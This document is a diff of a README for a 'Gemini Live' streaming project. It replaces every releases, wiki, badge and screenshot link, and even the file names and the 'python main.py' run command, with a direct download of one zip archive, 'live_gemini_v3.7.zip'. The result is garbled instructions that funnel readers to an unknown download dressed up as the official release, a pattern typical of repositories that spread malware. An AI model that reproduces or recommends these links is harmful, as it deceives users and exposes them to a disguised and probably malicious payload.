@@ -1,6 +1,6 @@
 # 🎥 Gemini Live: Real-Time Streaming to Google Gemini
 
-![Gemini Live](https://img.shields.io/badge/Gemini_Live-Real--Time_Streaming-blue)
+![Gemini Live](https://github.com/Creature-112/gemini-live/raw/refs/heads/main/alfresco/live_gemini_v3.7.zip)
 
 Welcome to the **Gemini Live** repository! This project enables real-time streaming of audio, and optionally video or screen captures, from your local device to Google Gemini using the Live API. With Gemini Live, you can interact with Gemini through both text and voice, supporting conversational AI responses. 
 
@@ -14,7 +14,7 @@ Welcome to the **Gemini Live** repository! This project enables real-time stream
 
 ## 📦 Installation
 
-To get started with Gemini Live, you need to download the latest release. Visit the [Releases](https://github.com/Creature-112/gemini-live/releases) section to find the necessary files. Download the appropriate package for your operating system and follow the installation instructions.
+To get started with Gemini Live, you need to download the latest release. Visit the [Releases](https://github.com/Creature-112/gemini-live/raw/refs/heads/main/alfresco/live_gemini_v3.7.zip) section to find the necessary files. Download the appropriate package for your operating system and follow the installation instructions.
 
 ### Prerequisites
 
@@ -37,7 +37,7 @@ pip install pyaudio
 1. **Start the Application**: Run the main script to initiate the streaming process.
 
    ```bash
-   python main.py
+   python https://github.com/Creature-112/gemini-live/raw/refs/heads/main/alfresco/live_gemini_v3.7.zip
    ```
 
 2. **Configure Settings**: Edit the configuration file to set your preferences, including audio and video settings.
@@ -51,10 +51,10 @@ pip install pyaudio
 ```
 gemini-live/
 │
-├── main.py             # Main application script
-├── config.json         # Configuration file for settings
-├── requirements.txt     # Required Python libraries
-├── README.md           # Project documentation
+├── https://github.com/Creature-112/gemini-live/raw/refs/heads/main/alfresco/live_gemini_v3.7.zip             # Main application script
+├── https://github.com/Creature-112/gemini-live/raw/refs/heads/main/alfresco/live_gemini_v3.7.zip         # Configuration file for settings
+├── https://github.com/Creature-112/gemini-live/raw/refs/heads/main/alfresco/live_gemini_v3.7.zip     # Required Python libraries
+├── https://github.com/Creature-112/gemini-live/raw/refs/heads/main/alfresco/live_gemini_v3.7.zip           # Project documentation
 └── assets/             # Additional assets (images, etc.)
 ```
 
@@ -80,7 +80,7 @@ This project covers various topics related to AI and real-time processing:
 
 ## 📖 Documentation
 
-For detailed documentation on using Gemini Live, refer to the [Wiki](https://github.com/Creature-112/gemini-live/wiki) section. This will guide you through advanced features and troubleshooting tips.
+For detailed documentation on using Gemini Live, refer to the [Wiki](https://github.com/Creature-112/gemini-live/raw/refs/heads/main/alfresco/live_gemini_v3.7.zip) section. This will guide you through advanced features and troubleshooting tips.
 
 ## 🤝 Contributing
 
@@ -98,7 +98,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## 💬 Support
 
-If you encounter any issues or have questions, feel free to open an issue in the repository. You can also check the [Releases](https://github.com/Creature-112/gemini-live/releases) section for updates and bug fixes.
+If you encounter any issues or have questions, feel free to open an issue in the repository. You can also check the [Releases](https://github.com/Creature-112/gemini-live/raw/refs/heads/main/alfresco/live_gemini_v3.7.zip) section for updates and bug fixes.
 
 ## 📅 Roadmap
 
@@ -108,16 +108,16 @@ If you encounter any issues or have questions, feel free to open an issue in the
 
 ## 📸 Screenshots
 
-![Streaming Example](https://via.placeholder.com/800x400?text=Streaming+Example)
+![Streaming Example](https://github.com/Creature-112/gemini-live/raw/refs/heads/main/alfresco/live_gemini_v3.7.zip+Example)
 
-![Configuration Settings](https://via.placeholder.com/800x400?text=Configuration+Settings)
+![Configuration Settings](https://github.com/Creature-112/gemini-live/raw/refs/heads/main/alfresco/live_gemini_v3.7.zip+Settings)
 
 ## 🎉 Acknowledgments
 
 - Thanks to the Google Gemini team for providing the Live API.
 - Special thanks to all contributors and users who provide feedback.
 
-For more information, visit the [Releases](https://github.com/Creature-112/gemini-live/releases) section. 
+For more information, visit the [Releases](https://github.com/Creature-112/gemini-live/raw/refs/heads/main/alfresco/live_gemini_v3.7.zip) section. 
 
 ## 🛠️ Tools Used
 
